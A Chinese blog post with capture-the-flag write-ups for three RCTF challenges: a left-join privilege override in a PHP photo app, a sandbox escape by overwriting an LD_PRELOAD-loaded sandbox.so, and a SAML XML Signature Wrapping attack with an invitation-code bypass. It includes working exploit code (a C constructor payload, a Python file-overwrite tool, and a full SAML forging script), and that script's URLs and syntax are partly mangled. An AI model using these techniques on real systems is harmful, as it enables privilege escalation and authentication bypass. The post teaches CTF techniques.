---
layout: post
title: RCTF复现
tag: CTF
---
## 1.Photographer
卡了我一整天的题竟然只是小小签到，崩溃了。。  

不过这道题也是给我理清了代码审计的思路。  

来看看源码：  

根目录里有一个配置文件，有这句：

```php
DocumentRoot /var/www/html/public
```

所以我们要去/public才能看到网站的一些代码。  

看到index，看看：  

```php
$routeLoader = require __DIR__ . '/../app/config/router.php';
```

进到router看看，最关键的应该是文件上传部分的代码：

```php
$router->post('/api/photos/upload', 'PhotoController@upload');
$router->get('/api/photos/{id}/info', 'PhotoController@info');
$router->post('/api/photos/delete', 'PhotoController@delete');
```

所以我们去看PhotoController这个类。  

在这个类里有upload这个函数，观察其逻辑可以发现关键的过滤机制为isValidImage函数（代码太长不想看就丢ai  

去看isValidImage函数：  

```php

function isValidImage($file) {
    $allowedExtensions = config('upload.allowed_extensions');
    
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($ext, $allowedExtensions)) {
        return false;
    }
    
    if ($file['size'] > config('upload.max_size')) {
        return false;
    }
    
    $imageInfo = @getimagesize($file['tmp_name']);
    if ($imageInfo === false) {
        return false;
    }
    
    return true;
}
```

这里是用了一个白名单过滤，直接防死：

```php
 'allowed_extensions' => ['jpg', 'jpeg', 'png', 'gif', 'webp']
```

去找新方法，在public目录下还有一个superadmin.php，其中

```php
if (Auth::check() && Auth::type() < $user_types['admin']) {
    echo getenv('FLAG') ?: 'RCTF{test_flag}';
```
当我们满足条件后访问这个路由就可以拿到flag。于是我们去看Auth::type是怎么得到的。

```php
public static function type() {
        return self::$user['type'];
    }
```

全局搜索self::$user

```php
public static function init() {
        if (session_status() === PHP_SESSION_NONE) {
            session_name(config('session.name'));
            session_start();
        }
        
        if (isset($_SESSION['user_id'])) {
            self::$user = User::findById($_SESSION['user_id']);
        }
    }
```
查看findById

```php
public static function findById($userId) {
        return DB::table('user')
            ->leftJoin('photo', 'user.background_photo_id', '=', 'photo.id')
            ->where('user.id', '=', $userId)
            ->first();
    }
```

这里leftjoin查询photo，会使photo.type覆盖原本的user.type，所以此时只需要将图片的Content-type改成-1，然后访问路由即可。  

## 2.rootkb

沙箱逃逸，可惜我当时不会。  

题目场景是一个允许用户执行Python代码的工具环境。  

发现`/opt/maxkb-app/sandbox/sandbox.so`这个文件是可写的。  

至此，沙箱逃逸的前提条件已经满足。  

触发机制：系统在运行用户的Python代码时，为了限制权限（沙箱化），会通过`LD_PRELOAD`环境变量强制加载`sandbox.so`这个动态链接库  

>什么是 LD_PRELOAD？ 它是 Linux 的一个环境变量，允许用户指定一个共享库（.so文件），在程序启动前优先加载。系统本意是利用这个 sandbox.so 里的逻辑来限制你的操作，但因为这个文件本身可被覆盖，攻击者就可以把它替换成恶意的 .so 文件，从而反客为主，获得代码执行权限。  

首先写出payload：

```c
#include <stdio.h>

// __attribute__((constructor)) 是 GCC 的特有语法
// 它的作用是：让 abc 函数在动态库被加载时（即 main 函数运行前）自动执行
__attribute__((constructor)) void abc(void) {
    const char *src = "/root/flag";
    const char *dst = "/opt/maxkb-app/apps/static/admin/assets/flag";
    // 将 root 目录下的 flag 文件，重命名（移动）到 Web 服务的静态资源目录下
    rename(src, dst);
}
```

>通常 Web 服务的用户权限无法直接读取 /root/flag。但是，如果加载 sandbox.so 的进程（父进程）是 Root 权限或者有足够的文件操作权限，那么注入的代码就能以高权限运行  

接下来要在本地将上面的C代码编译成动态链接库(.so文件)  

```bash
gcc -shared -fPIC exp.c -o exp.so
```

然后将生成的 exp.so 文件内容转换为 Base64 编码，以便在 Python 脚本中通过字符串形式传输  

接下来就要在自定义工具页面上传python工具

```python
import base64
import os

def fileWrite():
    # 1. 打开目标路径（原本的沙箱库文件），准备覆盖写入
    with open("/opt/maxkb-app/sandbox/sandbox.so", "wb") as f:
        # 2. 将我们在本地编译好并 base64 编码的恶意 so 文件内容写入
        f.write(base64.b64decode("实际的Base64字符串"))
    # 3. 触发加载
    # 当这里执行 os.popen 或任何系统调用时，或者当前 Python 进程本身启动时
    # 系统会根据配置尝试加载 LD_PRELOAD 指定的 sandbox.so
    # 此时加载的就是我们刚刚写入的恶意文件了
    os.popen("whoami") 
    
    return "success"
```
直接在浏览器访问`http://目标网站/static/admin/assets/flag`即可拿到flag  

## auth

通过代码审计，可以发现身份验证相关代码：

```python
@app.route('/admin')
def admin():
    if 'email' not in session:
        return redirect(url_for('saml_login'))
    
    if session.get('email') != 'admin@rois.team':
        return render_template('error.html', error='Insufficient permissions, admin access only'), 403
    
    return render_template_string(os.getenv("FLAG","RCTF{test_flag}"))

```

我们的身份需要是`admin@rois.team`才能拿到flag。

往上查阅，发现以下数据流：

```python
session['email'] = nameid

nameid = parser.get_nameid()

parser = SAMLResponseParser(
            saml_response, 
            IDP_CERT,
            validate_time=saml_config.validate_time,
            validate_audience=saml_config.validate_audience,
            expected_audience=SP_ENTITY_ID,
            validate_destination=saml_config.validate_destination,
            expected_destination=SP_ACS_URL,
            time_tolerance=saml_config.time_tolerance
        )

saml_response = request.form.get('SAMLResponse')
```

所以我们就可以理解这条数据流的逻辑：

1. **输入（Source）：** 用户通过 POST 请求提交 `SAMLResponse` 参数 -> **完全由攻击者控制**。
2. **处理：** 后端接收这个字符串，交给 `SAMLResponseParser` 进行解析。
3. **结果（Sink）：** 解析器提取出 `nameid`，如果没有问题，就把它放进 `session`，从而获得管理员权限。

下面有判断逻辑阻碍我们随意篡改数据：

```python
if not parser.is_valid():
            return render_template('error.html', error='SAML response validation failed'), 401
```

这一行代码通常会对 `SAMLResponse` 进行**数字签名验证**，确保数据确实来自可信的 IDP（身份提供商），而且没有被篡改。

看看 `is_valid()` 内部到底在检查什么：

```python
def is_valid(self):
        if not self.parse():
            return False
        
        if not self.validate_signature():
            return False
        
        if not self._check_assertion_uniqueness():
            return False
        
        return True
```

这个 `is_valid` 函数逻辑看起来非常简洁，它依次执行了三个检查：

1. `parse()`: 解析 XML 结构。
2. `validate_signature()`: 验证签名。
3. `_check_assertion_uniqueness()`: 检查是否重放攻击。

只要其中任何一个返回 `False`，整个验证就失败了。

在 CTF 题目中，**`validate_signature()`** 通常是最容易藏猫腻的地方。如果这里的逻辑写得不够严死，比如“如果没有签名就算验证通过”，或者“只验证了外层签名但用了内层数据”，我们就有机会了。

所以继续看：

```python
def validate_signature(self):
        if self.document is None:
            return False
            
        validator = SignatureValidator(
            self.document, 
            self.cert_text,
            validate_time=self.validate_time,
            validate_audience=self.validate_audience,
            expected_audience=self.expected_audience,
            validate_destination=self.validate_destination,
            expected_destination=self.expected_destination,
            time_tolerance=self.time_tolerance
        )
        return validator.validate()
```

它并没有亲自做校验，而是把任务外包给了 `SignatureValidator` 这个类。

看这个类（太长就不放出来了），其中`validate` 方法是关键：

```python
def validate(self):
        # ... 省略部分 ...
        
        response_signature = self._find_response_signature()
        if response_signature is not None:
             # 分支 A: 验证 Response 签名
            if not self._verify_signature(response_signature):
                return False
        else:
            # 分支 B: 验证 Assertion 签名
            assertion_signatures = self._find_assertion_signatures()
            if not assertion_signatures:
                return False
            
            for sig_node in assertion_signatures:
                if not self._verify_signature(sig_node):
                    return False
        
        # ... 省略后续检查 ...
        return True
```

> 这里有一个非常有意思的 **`if/else`** 逻辑。假设我们攻击时，直接把外层的 `<ds:Signature>`（Response 的签名）删掉，代码就会进入 **分支 B**（`else` 部分）。

现在，请设想这样一个场景：我们在 XML 里放了 **两个** `<saml:Assertion>` 结构。

1. **第一个 Assertion**：是我们伪造的 `admin@rois.team`，但是**没有签名**（没有 `<ds:Signature>` 节点）。
2. **第二个 Assertion**：是我们正常登录抓包拿到的、**带有合法签名**的普通用户 Assertion。

`validate` 函数里的 `for` 循环不会去检查那个**没有签名**的第一个 Assertion，只检查了第二个 Assertion（合法的），那么 `validate` 函数最终会返回 `True`。

这就是这个漏洞的核心所在：**Validator（校验器）和 Parser（解析器）之间的“信息不对称”。**

所以这是一个**XML 签名包装攻击 (XML Signature Wrapping / XSW)** 的变种。

攻击的方式很简单，但是这道题对于我们要注册一个合法账户设置了一个**邀请码**，我们需要绕过这个邀请码。

看看注册逻辑：

```python
if (parseInt(type) === 0) {
                if (!invitationCode || invitationCode !== config.getInviteCode()) {
                    return res.render('register', {
                        title: 'User Registration',
                        errors: [{ msg: 'Invalid invitation code' }],
                        formData: req.body
                    });
                }

            }

            req.session.userId = await User.create({
                username,
                email,
                password,
                type,
                displayName: displayName || username,
                department,
                role: 'user'
            });
```

这里用`(parseInt(type) === 0)`来判断是否为管理员注册，所以可以发送`{"type": false}`来绕过邀请码验证。

不过注册成功后 IdP 会直接设置 Session`req.session.userType = type` 但是`middleware/auth.js`检查的是`req.session.userType不等于type` (false)。所以需要重新登录⼀次。

然后发起 SSO，得到合法的 SAMLResponse。

脚本如下：

```python
import requests
import base64
import urllib.parse
from lxml import etree
import copy
import re
import random
import string
IDP_HOST = "<http: auth.rctf.rois.team>"
SP_HOST = "<http: auth-flag.rctf.rois.team:26000>"
def solve():
    s = requests.Session()
    # 注册登录
    rand_suffix = ''.join(random.choices(string.ascii_lowercase + 
                                         string.digits, k=6))
    username = f"hacker_{rand_suffix}"
    password = "password123"
    email = f"hacker_{rand_suffix}@example.com"
    print(username, password, email)
    register_url = f"{IDP_HOST}/register"
    reg_data = {
        "username": username,
        "email": email,
        "password": password,
        "confirmPassword": password,
        "type": False, #
        "displayName": "Hacker"
    }
    s.post(register_url, json=reg_data)
    s.cookies.clear()
    login_url = f"{IDP_HOST}/login"
    s.post(login_url, data={"username": username, "password": password})
    # 获取合法的 SAML Response
    sso_init_url = f"{IDP_HOST}/saml/idp/Flag"
    res = s.get(sso_init_url)
    saml_response_b64 = re.search(r'name="SAMLResponse" value="([^"]+)"', 
                                  res.text).group(1)
    # XML Signature Wrapping
    xml_content = base64.b64decode(saml_response_b64).decode('utf-8')
    root = etree.fromstring(xml_content.encode('utf-8'))
    ns = {'saml': 'urn:oasis:names:tc:SAML2.0:assertion', 'ds': 
          '<http: www.w3.org/2000/09/xmldsig#>'}
    original_assertion = root.find('. saml:Assertion', ns)
    fake_assertion = copy.deepcopy(original_assertion)
    fake_assertion.set('ID', f'_{urllib.parse.quote(username)}_fake')
    nameid_node = fake_assertion.find('. saml:NameID', ns)
    nameid_node.text = 'admin@rois.team'
    signature_node = fake_assertion.find('. ds:Signature', ns)
    if signature_node is not None:
        signature_node.getparent().remove(signature_node)
        root.insert(1, fake_assertion)

        evil_xml = etree.tostring(root, encoding='utf-8').decode('utf-8')
        evil_saml_response = base64.b64encode(evil_xml.encode('utf8')).decode('utf-8')
        # 认证
        sp_acs_url = f"{SP_HOST}/saml/acs"
        sp_session = requests.Session()
        res = sp_session.post(sp_acs_url, data={
            "SAMLResponse": evil_saml_response,
            "RelayState": "/admin"
        }, allow_redirects=False)

        redirect_url = res.headers.get('Location')
        target_url = f"{SP_HOST}{redirect_url}" if redirect_url.startswith("/") 
        else redirect_url
        final_res = sp_session.get(target_url)
        print(final_res.text) 

        if name  " main ":
            solve()
```

